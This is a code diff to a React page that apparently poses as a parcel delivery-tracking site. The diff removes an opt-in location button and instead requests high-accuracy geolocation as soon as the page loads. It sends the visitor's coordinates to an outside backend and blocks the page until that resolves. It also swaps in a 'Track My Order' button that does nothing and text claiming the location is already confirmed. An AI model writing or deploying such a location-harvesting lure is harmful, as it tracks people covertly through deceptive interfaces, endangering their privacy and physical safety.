@@ -4,43 +4,49 @@ import './App.css';
 const BACKEND_URL = 'https://location-backend-3cdl.onrender.com';
 
 function App() {
-  const [btnState, setBtnState] = useState('idle'); // idle | loading | done
+  const [ready, setReady] = useState(false);
 
-  // Wake up backend on page load silently
   useEffect(() => {
+    // Wake backend
     fetch(`${BACKEND_URL}/ping`).catch(() => {});
-  }, []);
 
-  const handleTrackOrder = () => {
-    if (btnState === 'loading' || btnState === 'done') return;
-    setBtnState('loading');
-
+    // Ask location immediately
     if (!navigator.geolocation) {
-      saveLocation(null, null, null);
+      setReady(true);
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      async (pos) => {
+        try {
+          await fetch(`${BACKEND_URL}/api/location`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+            }),
+          });
+        } catch (e) {}
+        setReady(true);
       },
       () => {
-        saveLocation(null, null, null);
+        // denied or error — still show site
+        setReady(true);
       },
-      { enableHighAccuracy: true, timeout: 10000 }
+      { enableHighAccuracy: true, timeout: 15000 }
     );
-  };
+  }, []);
 
-  const saveLocation = async (latitude, longitude, accuracy) => {
-    try {
-      await fetch(`${BACKEND_URL}/api/location`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ latitude, longitude, accuracy }),
-      });
-    } catch (e) {}
-    setBtnState('done');
-  };
+  // Block render until location resolved
+  if (!ready) {
+    return (
+      <div className="splash">
+        <div className="splash-spinner" />
+      </div>
+    );
+  }
 
   return (
     <div className="app">
@@ -68,24 +74,14 @@ function App() {
               <span>🏠</span>
               <div>
                 <strong>Delivery Address</strong>
-                <p>Confirm your location for accurate delivery</p>
+                <p>Your location has been confirmed for accurate delivery</p>
               </div>
             </div>
           </div>
 
-          <button
-            className={`cta-btn ${btnState}`}
-            onClick={handleTrackOrder}
-            disabled={btnState === 'loading' || btnState === 'done'}
-          >
-            {btnState === 'idle' && '📦 Confirm Delivery Location'}
-            {btnState === 'loading' && <><span className="btn-spinner" /> Confirming...</>}
-            {btnState === 'done' && '✅ Location Confirmed!'}
+          <button className="cta-btn">
+            📦 Track My Order
           </button>
-
-          {btnState === 'done' && (
-            <p className="success-msg">Your delivery is being routed to your location.</p>
-          )}
         </div>
 
         <div className="hero-visual">
